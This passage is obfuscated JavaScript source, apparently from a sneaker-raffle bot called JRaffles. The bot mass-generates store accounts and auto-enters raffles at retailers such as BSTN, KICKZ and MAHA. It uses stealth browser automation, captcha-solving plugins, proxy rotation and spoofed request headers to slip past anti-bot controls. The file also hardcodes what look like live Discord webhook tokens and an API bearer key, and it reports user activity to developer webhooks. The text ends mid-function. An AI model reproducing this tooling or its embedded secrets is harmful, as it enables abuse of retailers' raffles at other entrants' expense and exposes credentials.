const { EmbedBuilder: _0x5ad5e2 } = require('discord.js');
var _0x1747e3 = require('exe');
const { execFile: _0x134d98 } = require('child_process'), _0x4efd86 = require('puppeteer-extra'), _0x1fedc1 = require('puppeteer-extra-plugin-recaptcha'), _0x202680 = require('puppeteer-extra-plugin-stealth'), _0x1818b9 = require('chalk'), _0x57f604 = require('node-bash-title'), _0x550d6b = require('fs'), _0x7d1ebe = require('axios'), _0x3d999c = require('papaparse');
var _0x3ed7e7 = require('random-name');
const _0x19b48a = require('request');
var _0x8f638f = require('prompt');
const _0x596f7f = _0x19b48a['jar']();
var _0x401d1c = {};
const _0x26965a = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x235f42 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x46b00e = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x542c6e = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4a8fe1 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x3ef102 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x5b0924 = 'https://discord.com/api/webhooks/', _0x3d6b43 = '' + _0x5b0924 + _0x46b00e, _0x3cac51 = '' + _0x5b0924 + _0x542c6e, _0xc8def8 = '' + _0x5b0924 + _0x26965a, _0x51c252 = '' + _0x5b0924 + _0x235f42, _0x45ab34 = '' + _0x5b0924 + _0x4a8fe1, _0x35897b = '' + _0x5b0924 + _0x3ef102;
const _0x41a6f8 = JSON['parse'](_0x550d6b['readFileSync']('../package.json', 'utf-8')), _0x431e19 = _0x41a6f8['version'];
var _0xb37a88, _0x39f01a, _0xc653bf, _0x35cde3, _0x4f3e4d, _0x1d3112, _0x54444c, _0x1556f5;
const _0x2e8651 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x51818c = ![];
const _0x38fc54 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x4f36c9 = '0123456789';
var _0x3ec733 = _0x38fc54['split']('');
const _0x48d435 = require('auto-git-update'), { PageEmittedEvents: _0x5f15ae } = require('puppeteer'), { getRandomValues: _0x49ed4d } = require('crypto'), { resolve: _0x36b6fc } = require('path'), { Console: _0x448163 } = require('console'), _0x552d8e = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0xf2c255 = new _0x48d435(_0x552d8e);
async function _0x45abb1() {
    _0x4f3e4d = _0x550d6b['readdirSync']('../proxies'), _0x35cde3 = _0x550d6b['readdirSync']('../tasks'), !_0x550d6b['existsSync']('../accounts/fenom.csv') && _0x550d6b['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x550d6b['existsSync']('../accounts/bstn.csv') && _0x550d6b['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), _0x401d1c = JSON['parse'](_0x550d6b['readFileSync']('../settings.json', 'utf-8')), !_0x401d1c['delay'] && (_0x401d1c['delay'] = 0x2710, _0x550d6b['writeFileSync']('../settings.json', JSON['stringify'](_0x401d1c))), !_0x401d1c['captchaKey'] && (_0x401d1c['captchaKey'] = '', _0x550d6b['writeFileSync']('../settings.json', JSON['stringify'](_0x401d1c))), !_0x401d1c['useRandomProxy'] && (_0x401d1c['useRandomProxy'] = !![], _0x550d6b['writeFileSync']('../settings.json', JSON['stringify'](_0x401d1c))), !_0x401d1c['webhook'] && (_0x401d1c['webhook'] = '', _0x550d6b['writeFileSync']('../settings.json', JSON['stringify'](_0x401d1c))), _0x401d1c['MahaDelay'] = _0x401d1c['delay'], _0x5b0924 = _0x401d1c['webhook'], _0x1d3112 = _0x401d1c['licenseKey'];
}
let _0x18d6ce, _0x444382 = [], _0x16a8df;
const _0x491ae3 = _0x47bc4d => new Promise(_0x27bdaf => setTimeout(_0x27bdaf, _0x47bc4d));
function _0x15dd0d(_0x49de92, _0x31ece3) {
    return Math['floor'](Math['random']() * (_0x31ece3 - _0x49de92 + 0x1) + _0x49de92);
}
async function _0x3bbbc4(_0x1645a2) {
    return _0x7d1ebe['get']('https://api.hyper.co/v4/licenses/' + _0x1645a2, { 'headers': { 'Authorization': 'Bearer\x20' + _0x2e8651 } })['then'](_0x12bbf9 => _0x12bbf9['data'])['catch'](() => null);
}
;
async function _0x5f1152(_0x52f8f9) {
    console['clear']();
    if (_0x52f8f9 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x550152 = await _0x8f638f['get']('License');
        if (_0x550152['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x491ae3(0xbb8), _0x5f1152(_0x52f8f9);
        _0x52f8f9 = _0x550152['License'], _0x401d1c['licenseKey'] = _0x52f8f9, _0x1d3112 = _0x52f8f9, _0x550d6b['writeFileSync']('../settings.json', JSON['stringify'](_0x401d1c));
    }
    console['log']('Checking\x20license\x20' + _0x1d3112 + '...'), await _0x491ae3(0x320);
    const _0x153b6e = await _0x3bbbc4(_0x52f8f9);
    _0x54444c = JSON['stringify'](_0x153b6e['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x1556f5 = JSON['stringify'](_0x153b6e['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x153b6e)
        return console['log']('License\x20not\x20found');
    if (!_0x153b6e['user'])
        return console['log']('License\x20not\x20bound');
    return _0x153b6e['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x51818c = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x51818c = ![]);
}
async function _0x36de3b() {
    var _0x26a913 = await _0x8f638f['get']('Module');
    return console['clear'](), _0x26a913['Module'];
}
;
async function _0xdd8676() {
    var _0x2f7773 = await _0x8f638f['get']('Setting');
    return console['clear'](), _0x2f7773['Setting'];
}
async function _0x4ba3ca() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x2be4dc = 0x0; _0x2be4dc < _0x35cde3['length']; _0x2be4dc++) {
        console['log']('\x20(' + _0x2be4dc + ')\x20' + _0x35cde3[_0x2be4dc]);
    }
    console['log']('');
    var _0x1c66f4 = await _0x8f638f['get']('Task');
    if (_0x1c66f4['Task'] > _0x35cde3['length'] - 0x1 || isNaN(_0x1c66f4['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x491ae3(0x3e8), _0x4ba3ca();
    var _0x56e107 = _0x550d6b['readFileSync']('../tasks/' + _0x35cde3[_0x1c66f4['Task']], 'utf-8');
    return _0xc653bf = _0x3d999c['parse'](_0x56e107, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x1818b9['blue'](_0x35cde3[_0x1c66f4['Task']])), _0xb37a88 = _0x35cde3[_0x1c66f4['Task']], _0xc653bf;
}
async function _0x5c29d8() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x187bbf = 0x0; _0x187bbf < _0x4f3e4d['length']; _0x187bbf++) {
        console['log']('\x20(' + _0x187bbf + ')\x20' + _0x4f3e4d[_0x187bbf]);
    }
    console['log']('');
    var _0x43a911 = await _0x8f638f['get']('Proxies');
    if (_0x43a911['Proxies'] > _0x4f3e4d['length'] - 0x1 || isNaN(_0x43a911['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x491ae3(0x3e8), _0x5c29d8();
    var _0x188748 = _0x550d6b['readFileSync']('../proxies/' + _0x4f3e4d[_0x43a911['Proxies']], 'utf-8')['split']('\x0a');
    let _0x56cc0a = _0x188748['map']((_0x41e284, _0x304e60) => {
        sanatizeProxy = _0x41e284['replace']('\x0d', '');
        if (_0x188748[_0x304e60 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x39f01a = _0x4f3e4d[_0x43a911['Proxies']], console['clear'](), _0x56cc0a;
}
async function _0x493ea4() {
    var _0x24654d = await _0x8f638f['get']('Value');
    return console['clear'](), _0x24654d['Value'];
}
async function _0x11fa5a(_0x385bf9) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x1885b7 = 0x0; _0x1885b7 < _0x385bf9['length']; _0x1885b7++) {
        console['log']('\x20(' + _0x1885b7 + ')\x20[' + _0x385bf9[_0x1885b7]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x2b7785 = await _0x8f638f['get']('Module');
    return _0x2b7785['Module'];
}
async function _0x1db984() {
    var _0x2735e8 = await _0x8f638f['get']('Password');
    return console['clear'](), _0x2735e8['Password'];
}
;
async function _0x5213c7() {
    var _0x19b446 = await _0x8f638f['get']('Links');
    return _0x19b446['Links'];
}
;
async function _0x251601() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x5528aa = 0x0; _0x5528aa < _0x444382['length']; _0x5528aa++) {
        console['log']('\x20(' + _0x5528aa + ')\x20' + _0x444382[_0x5528aa]);
    }
    ;
    console['log']();
    let _0x1d0bb6 = await _0x8f638f['get']('Product');
    return console['clear'](), _0x1d0bb6['Product'];
}
;
function _0x1e4ea5() {
    var _0x41e399 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x41e399;
}
;
const _0x461b58 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'SQ43yf',
                            'custom_source': 'DZ5485-052',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WLQk7t',
                                '$consent_form_version': 0x7f71d6,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0xafb19d(_0x2f0c1a, _0x2cf2f5) {
    let _0x7d1a18 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x431e19 != 'devkey') {
        await _0x7d1ebe['post'](_0x2f0c1a, _0x2cf2f5, _0x7d1a18);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x344cc9(_0xbb67fd, _0x23e012, _0x7307a1, _0x2b9419, _0x5e649e) {
    if (!_0x2b9419 && _0x7307a1 == 'dev') {
        var _0x19dfef = new _0x5ad5e2()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x23e012['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x23e012['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0xbb67fd['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x401d1c['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x54444c,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0xbb67fd['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x431e19,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x19dfef['data'];
    } else {
        if (_0x2b9419 && _0x7307a1 == 'dev') {
            var _0x19dfef = new _0x5ad5e2()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x23e012['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x54444c,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x23e012['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0xbb67fd['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x401d1c['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x5e649e,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0xbb67fd['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x431e19,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x19dfef['data'];
        } else {
            if (_0x7307a1 == 'pub') {
                var _0x19dfef = new _0x5ad5e2()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x23e012['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x23e012['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0xbb67fd['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x401d1c['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0xbb67fd['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x431e19,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x19dfef['data'];
            } else {
                if (_0x7307a1 == 'acc' && !_0x2b9419) {
                    var _0x19dfef = new _0x5ad5e2()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x23e012['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x54444c,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x23e012['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x401d1c['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x431e19,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x19dfef['data'];
                } else {
                    if (_0x7307a1 == 'acc' && _0x2b9419) {
                        var _0x19dfef = new _0x5ad5e2()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x23e012['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x54444c,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x5e649e,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x23e012['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x401d1c['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x431e19,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x19dfef['data'];
                    } else {
                        if (_0x7307a1 == 'open') {
                            var _0x19dfef = new _0x5ad5e2()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x1556f5)['addFields']({
                                'name': 'User',
                                'value': '' + _0x54444c,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x431e19,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x19dfef['data'];
                        } else {
                            if (!_0x2b9419 && _0x7307a1 == 'ver') {
                                var _0x19dfef = new _0x5ad5e2()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x23e012['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x54444c,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x23e012['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x401d1c['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x431e19,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x19dfef['data'];
                            } else {
                                if (_0x2b9419 && _0x7307a1 == 'ver') {
                                    var _0x19dfef = new _0x5ad5e2()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x23e012['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x54444c,
                                        'inline': !![]
                                    }, {
